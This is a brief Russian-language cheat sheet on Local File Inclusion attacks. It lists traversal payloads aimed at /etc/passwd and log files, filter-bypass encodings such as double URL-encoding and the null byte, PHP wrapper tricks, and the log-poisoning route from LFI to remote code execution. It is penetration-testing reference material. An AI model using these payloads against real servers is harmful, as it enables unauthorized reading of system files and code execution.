# 🐚 LFI Tricks (Local File Inclusion)

## 🔎 Основные полезные пути:
- `/etc/passwd`
- `/proc/self/environ`
- `/var/log/apache2/access.log`
- `../../../../../../etc/passwd`

## 🔁 Обход фильтров:
- Двойной URL-энкодинг: `%252e%252e%252f`
- Null byte (для старых PHP): `%00`

## 📂 Windows:
- `C:\boot.ini`
- `C:\Windows\win.ini`

## 🔧 Полезные техники:
- LFI → RCE через `access.log`
- LFI + php://input
- LFI + wrapper (zip://, data://)

## 🛠 Инструменты:
- `ffuf`, `wfuzz` — для перебора
- `burp`, `LFI Suite`

## 🔗 Ссылки:
- https://book.hacktricks.xyz/pentesting-web/file-inclusion

